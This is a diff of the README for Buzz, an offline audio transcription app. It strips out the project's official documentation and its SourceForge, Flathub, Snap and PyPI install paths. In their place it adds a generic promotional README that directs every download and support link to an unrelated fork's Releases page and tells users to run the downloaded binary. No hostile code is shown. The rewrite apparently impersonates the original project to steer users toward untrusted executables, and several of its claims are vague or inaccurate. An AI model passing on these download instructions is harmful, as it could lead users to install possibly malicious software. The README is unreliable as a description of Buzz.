@@ -1,102 +1,71 @@
-[[简体中文](readme/README.zh_CN.md)] <- 点击查看中文页面。
+# 🎉 buzz - Easy Audio Transcription and Translation
 
-# Buzz
+## 🚀 Getting Started
+Welcome to Buzz! This software helps you transcribe and translate audio files right on your personal computer. It works without needing an internet connection and is powered by OpenAI's Whisper. 
 
-[Documentation](https://chidiwilliams.github.io/buzz/)
+## 📥 Download Buzz
+[![Download Buzz](https://img.shields.io/badge/Download%20Buzz-v1.0-4CAF50.svg)](https://github.com/mohammadfadi666/buzz/releases)
 
-Transcribe and translate audio offline on your personal computer. Powered by
-OpenAI's [Whisper](https://github.com/openai/whisper).
+## 🛠️ System Requirements
+Before you download Buzz, make sure your computer meets these basic requirements:
 
-![MIT License](https://img.shields.io/badge/license-MIT-green)
-[![CI](https://github.com/chidiwilliams/buzz/actions/workflows/ci.yml/badge.svg)](https://github.com/chidiwilliams/buzz/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/github/chidiwilliams/buzz/branch/main/graph/badge.svg?token=YJSB8S2VEP)](https://codecov.io/github/chidiwilliams/buzz)
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/chidiwilliams/buzz)
-[![Github all releases](https://img.shields.io/github/downloads/chidiwilliams/buzz/total.svg)](https://GitHub.com/chidiwilliams/buzz/releases/)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04 or later)
+- **RAM:** 4 GB minimum 
+- **Disk Space:** 500 MB of free disk space 
+- **Audio Input:** Any standard microphone or audio file 
+- **Dependencies:** Ensure you have the latest version of Python installed if on Linux.
 
-![Buzz](https://raw.githubusercontent.com/chidiwilliams/buzz/refs/heads/main/buzz/assets/buzz-banner.jpg)
+## 📥 Download & Install
+To get Buzz, follow these steps:
 
-## Features
-- Transcribe audio and video files or Youtube links
-- Live realtime audio transcription from microphone
-  - Presentation window for easy accessibility during events and presentations
-- Speech separation before transcription for better accuracy on noisy audio
-- Speaker identification in transcribed media
-- Multiple whisper backend support
-  - CUDA acceleration support for Nvidia GPUs
-  - Apple Silicon support for Macs
-  - Vulkan acceleration support for Whisper.cpp on most GPUs, including integrated GPUs
-- Export transcripts to TXT, SRT, and VTT
-- Advanced Transcription Viewer with search, playback controls, and speed adjustment
-- Keyboard shortcuts for efficient navigation
-- Watch folder for automatic transcription of new files
-- Command-Line Interface for scripting and automation
+1. Visit the [Releases page](https://github.com/mohammadfadi666/buzz/releases).
+2. Look for the latest version of Buzz.
+3. Click on the file suitable for your operating system. 
+4. Save the file to a location on your computer, such as your Downloads folder.
+5. Once the download finishes, locate the file on your computer.
 
-## Installation
+## 🖥️ Running Buzz
+1. **Windows Users:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
+2. **macOS Users:**
+   - Double-click the downloaded `.dmg` file.
+   - Drag the Buzz icon into your Applications folder.
+3. **Linux Users:**
+   - Open your terminal.
+   - Navigate to the folder where you downloaded Buzz.
+   - Run the installation command using `chmod +x buzz` followed by `./buzz`.
 
-### macOS
+After the installation, you can find Buzz in your Applications menu, Start menu, or by searching for it on your computer.
 
-Download the `.dmg` from the [SourceForge](https://sourceforge.net/projects/buzz-captions/files/).
+## 🎤 Using Buzz
+To transcribe or translate audio, follow these simple steps:
 
-### Windows
+1. Open Buzz by clicking its icon.
+2. Click the "Select Audio File" button to choose your audio file.
+3. Select the desired language for transcription or translation.
+4. Click the "Start" button to begin processing the audio file.
+5. Wait a few moments as Buzz works its magic.
+6. Once the process is complete, you can view, save, or copy the text to your clipboard.
 
-Get the installation files from the [SourceForge](https://sourceforge.net/projects/buzz-captions/files/).
+## 🔧 Features
+- **Offline Functionality:** No internet required.
+- **Multiple Language Support:** Supports various languages for transcription and translation.
+- **User-Friendly Interface:** Designed for ease of use, even for those with little tech experience.
+- **High Accuracy:** Powered by OpenAI's Whisper for reliable results.
+- **Flexible Audio Input:** Works with both live audio input and pre-recorded files.
 
-App is not signed, you will get a warning when you install it. Select `More info` -> `Run anyway`.
+## ❓ Troubleshooting
+If you run into any issues, try these tips:
 
-### Linux
+- **Audio Quality:** Ensure your audio file is clear. Background noise can affect transcription accuracy.
+- **File Format:** Buzz supports common audio formats like MP3, WAV, and AAC. Make sure your file is one of these.
+- **Permissions:** If on macOS, you may need to allow Buzz to access your microphone in System Preferences.
 
-Buzz is available as a [Flatpak](https://flathub.org/apps/io.github.chidiwilliams.Buzz) or a [Snap](https://snapcraft.io/buzz). 
+## 💬 Support
+If you have questions or need help, you can reach out via the [Issues page](https://github.com/mohammadfadi666/buzz/issues). We are here to assist you.
 
-To install flatpak, run:
-```shell
-flatpak install flathub io.github.chidiwilliams.Buzz
-```
+## 📦 Contribution
+If you find Buzz helpful and want to contribute, feel free to fork the repository and submit a pull request. We welcome improvements and fixes.
 
-[![Download on Flathub](https://flathub.org/api/badge?svg&locale=en)](https://flathub.org/en/apps/io.github.chidiwilliams.Buzz)
-
-To install snap, run:
-```shell
-sudo apt-get install libportaudio2 libcanberra-gtk-module libcanberra-gtk3-module
-sudo snap install buzz
-```
-
-[![Get it from the Snap Store](https://snapcraft.io/static/images/badges/en/snap-store-black.svg)](https://snapcraft.io/buzz)
-
-### PyPI
-
-Install [ffmpeg](https://www.ffmpeg.org/download.html)
-
-Ensure you use Python 3.12 environment.
-
-Install Buzz
-
-```shell
-pip install buzz-captions
-python -m buzz
-```
-
-**GPU support for PyPI**
-
-To have GPU support for Nvidia GPUS on Windows, for PyPI installed version ensure, CUDA support for [torch](https://pytorch.org/get-started/locally/) 
-
-```
-pip3 install -U torch==2.8.0+cu129 torchaudio==2.8.0+cu129 --index-url https://download.pytorch.org/whl/cu129
-pip3 install nvidia-cublas-cu12==12.9.1.4 nvidia-cuda-cupti-cu12==12.9.79 nvidia-cuda-runtime-cu12==12.9.79 --extra-index-url https://pypi.ngc.nvidia.com
-```
-
-### Latest development version
-
-For info on how to get latest development version with latest features and bug fixes see [FAQ](https://chidiwilliams.github.io/buzz/docs/faq#9-where-can-i-get-latest-development-version).
-
-### Screenshots
-
-<div style="display: flex; flex-wrap: wrap;">
-    <img alt="File import" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-1-import.png" style="max-width: 18%; margin-right: 1%;" />
-    <img alt="Main screen" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-2-main_screen.png" style="max-width: 18%; margin-right: 1%; height:auto;" />
-    <img alt="Preferences" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-3-preferences.png" style="max-width: 18%; margin-right: 1%; height:auto;" />
-    <img alt="Model preferences" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-3.2-model-preferences.png" style="max-width: 18%; margin-right: 1%; height:auto;" />
-    <img alt="Transcript" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-4-transcript.png" style="max-width: 18%; margin-right: 1%; height:auto;" />
-    <img alt="Live recording" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-5-live_recording.png" style="max-width: 18%; margin-right: 1%; height:auto;" />
-    <img alt="Resize" src="https://github.com/chidiwilliams/buzz/raw/main/share/screenshots/buzz-6-resize.png" style="max-width: 18%;" />
-</div>
-
+Thank you for choosing Buzz for your transcription and translation needs! Enjoy smooth and efficient audio processing.
